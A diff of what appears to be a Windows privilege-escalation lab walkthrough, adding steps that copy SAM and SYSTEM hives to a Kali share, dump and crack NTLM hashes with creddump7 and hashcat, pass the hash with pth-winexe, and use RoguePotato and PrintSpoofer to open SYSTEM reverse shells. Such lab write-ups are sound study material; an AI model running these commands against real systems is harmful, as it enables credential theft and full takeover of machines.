@@ -272,19 +272,25 @@ copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
 ```
 {% endcode %}
 
-We successfully copied SAM and SYSTEM to our Kali Linux machine. Now we need to extract the hash using another tool called ‘[CredDump](https://github.com/Neohapsis/creddump7.git)’.
+We successfully copied SAM and SYSTEM to our Kali Linux machine. Now we need to extract the hash using another tool called ‘[CredDump](https://github.com/Neohapsis/creddump7.git)’. Its installed by default in kali.
 
+`/usr/share/creddump7/pwdump.py SYSTEM SAM` - cmd to dump hashes.
 
+<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption><p>hashes</p></figcaption></figure>
 
+Cracking the admin NTLM hash using hashcat:
 
+`hashcat -m 1000 --force hashes /usr/share/wordlists/rockyou.txt` -&#x20;
 
+We get the passwords for each account.
 
+<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 ### 10 - Passwords - Passing the Hash
 
 When we get the admin user NTHash/NTLM hash, we can use pass-the-hash attack to authenticate with the hash instead.
 
-`pth-winexe -U 'admin%<LM:NTHas>'`` ``10.10.124.222 cmd.exe` .
+`pth-winexe -U 'admin%<LM:NTHas>' 10.10.124.222 cmd.exe` .
 
 ### 11 - Scheduled Tasks
 
@@ -384,9 +390,9 @@ Now we need to run rogue potato binary file on target with arguments (on the loc
 
 Before we do that, we need to start another netcat listener on kali machine.
 
-`C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999`
+`C:\PrivEsc\RoguePotato.exe -r 10.18.88.214 -e "C:\PrivEsc\reverse.exe" -l 9999` - "-r" (remote IP — Kali IP), "-e" (reverse shell executable path) and "-l" listening port.&#x20;
 
-&#x20;this is run on the (local system) shell we got earlier in Image 2.
+this is run on the (local system) shell we got earlier in Image 2.
 
 Finally..
 
@@ -394,19 +400,33 @@ Finally..
 
 And We get "NT Authority"
 
-### 15 -&#x20;
+### 15 - **Token Impersonation — PrintSpoofer**
 
+The goal of [PrintSpoofer](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) and RoguePotato is same to elevate privileges using same technique “SeImpersonatePrivilege”.&#x20;
 
+> Exploit tools of the Potato family are all based on the same idea: relaying a network authentication from a loopback TCP endpoint to an NTLM negotiator. To do so, they trick the NT AUTHORITY\SYSTEM account into connecting and authenticating to an RPC server they control by leveraging some peculiarities of the IStorage COM interface. This blog explains more technically than I ever could. [Read](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
 
+So, this exploit to work, we need local service or network service access and with “SeImpersonatePrivilege” or “SeAssignPrimaryTokenPrivilege” enabled.
 
+Just like in Section 14, we need "Local Service" access 1st.&#x20;
 
+Start another listener on Kali, Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):
 
+`C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i`
 
+<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption><p>Done</p></figcaption></figure>
 
+## Conclusion
 
+### Privilege Escalation Scripts
 
+Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\PrivEsc directory:
 
+winPEASany.exe
 
+Seatbelt.exe
 
+PowerUp.ps1
 
+SharpUp.exe
 
